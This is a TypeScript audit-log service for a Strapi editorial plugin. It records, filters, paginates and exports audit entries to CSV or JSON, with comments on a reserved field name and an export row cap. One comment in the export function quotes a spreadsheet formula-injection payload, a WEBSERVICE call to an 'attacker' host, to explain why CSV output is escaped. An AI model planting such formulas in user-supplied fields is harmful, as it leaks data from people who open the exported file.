/**
 * Audit service (§4.5 / Req §5). Append-only writer + filterable reader +
 * CSV/JSON exporter over the plugin's own `audit-log` table. Writes go through
 * `strapi.db.query` (not the document service) so they never re-enter the
 * document middleware — no audit-of-audit loop.
 */
import type { Core } from "@strapi/strapi";
import { toCsv } from "@vng/shared";

const AUDIT_UID = "plugin::editorial.audit-log";

/**
 * Note on `entryDocumentId`: it holds the `documentId` of the *audited* entry, and
 * is deliberately not called `documentId`. Strapi reserves that attribute name on
 * every model and refuses to boot if a content type declares it —
 * `transformContentTypesToModels` throws before the HTTP server ever starts. This
 * plugin shipped with the reserved name and never surfaced it, because a separate
 * packaging bug meant the plugin itself was never loaded (see
 * `src/bootstrap/assert-plugins.ts`). Fixing the packaging exposed the crash.
 */
export interface AuditEntry {
  action: string;
  contentType?: string | null;
  entryDocumentId?: string | null;
  locale?: string | null;
  entryTitle?: string | null;
  actorId?: number | null;
  actorEmail?: string | null;
  actorName?: string | null;
  fromStatus?: string | null;
  toStatus?: string | null;
  reason?: string | null;
  snapshot?: unknown;
}

export interface AuditFilters {
  action?: string;
  contentType?: string;
  entryDocumentId?: string;
  actorEmail?: string;
  from?: string; // ISO date lower bound (timestamp >=)
  to?: string; // ISO date upper bound (timestamp <=)
}

const CSV_COLUMNS = [
  "id",
  "timestamp",
  "action",
  "contentType",
  "entryDocumentId",
  "locale",
  "entryTitle",
  "fromStatus",
  "toStatus",
  "actorEmail",
  "actorName",
  "reason",
] as const;

/**
 * Ceiling on rows a single export may materialise. The whole result set is held
 * in memory, serialised, and sent as one response body, so an unbounded export
 * against a mature audit table is a memory-exhaustion vector — triggerable by an
 * authorised user with no filters set. 100k rows is far past any real
 * compliance query; narrow with the `from`/`to` filters instead.
 */
const EXPORT_ROW_LIMIT = 100_000;

function buildWhere(filters: AuditFilters): Record<string, unknown> {
  const where: Record<string, unknown> = {};
  if (filters.action) where.action = filters.action;
  if (filters.contentType) where.contentType = filters.contentType;
  if (filters.entryDocumentId) where.entryDocumentId = filters.entryDocumentId;
  if (filters.actorEmail) where.actorEmail = filters.actorEmail;
  if (filters.from || filters.to) {
    where.timestamp = {
      ...(filters.from ? { $gte: filters.from } : {}),
      ...(filters.to ? { $lte: filters.to } : {}),
    };
  }
  return where;
}

export default ({ strapi }: { strapi: Core.Strapi }) => ({
  /** Append an immutable audit entry. Best-effort callers may ignore failures. */
  async record(entry: AuditEntry) {
    return strapi.db.query(AUDIT_UID).create({
      data: { ...entry, timestamp: new Date() },
    });
  },

  /** Filterable, paginated read for the admin audit viewer. */
  async list(params: { filters?: AuditFilters; page?: number; pageSize?: number }) {
    const page = Math.max(1, params.page ?? 1);
    const pageSize = Math.min(200, Math.max(1, params.pageSize ?? 50));
    const where = buildWhere(params.filters ?? {});

    const [results, total] = await Promise.all([
      strapi.db.query(AUDIT_UID).findMany({
        where,
        orderBy: { timestamp: "desc" },
        limit: pageSize,
        offset: (page - 1) * pageSize,
      }),
      strapi.db.query(AUDIT_UID).count({ where }),
    ]);

    return {
      results,
      pagination: { page, pageSize, total, pageCount: Math.ceil(total / pageSize) },
    };
  },

  /**
   * Export all matching rows as CSV or JSON (§4.5: "hỗ trợ xuất file audit").
   *
   * CSV goes through `@vng/shared`'s `toCsv`, which neutralises spreadsheet
   * formula prefixes. That matters here specifically: `reason`, `entryTitle` and
   * `actorName` are written by editors, and a rejection reason of
   * `=WEBSERVICE("https://attacker/?"&A1)` would exfiltrate the row the moment a
   * compliance reviewer opened the export in Excel. The previous quote-only
   * escaping did not help — spreadsheets strip quotes before evaluating.
   */
  async exportEntries(filters: AuditFilters, format: "csv" | "json") {
    const rows = await strapi.db.query(AUDIT_UID).findMany({
      where: buildWhere(filters),
      orderBy: { timestamp: "desc" },
      limit: EXPORT_ROW_LIMIT,
    });

    if (format === "json") {
      return {
        body: JSON.stringify(rows, null, 2),
        contentType: "application/json",
        filename: "audit-log.json",
      };
    }

    return {
      body: toCsv(CSV_COLUMNS, rows as Array<Record<string, unknown>>),
      contentType: "text/csv",
      filename: "audit-log.csv",
    };
  },
});
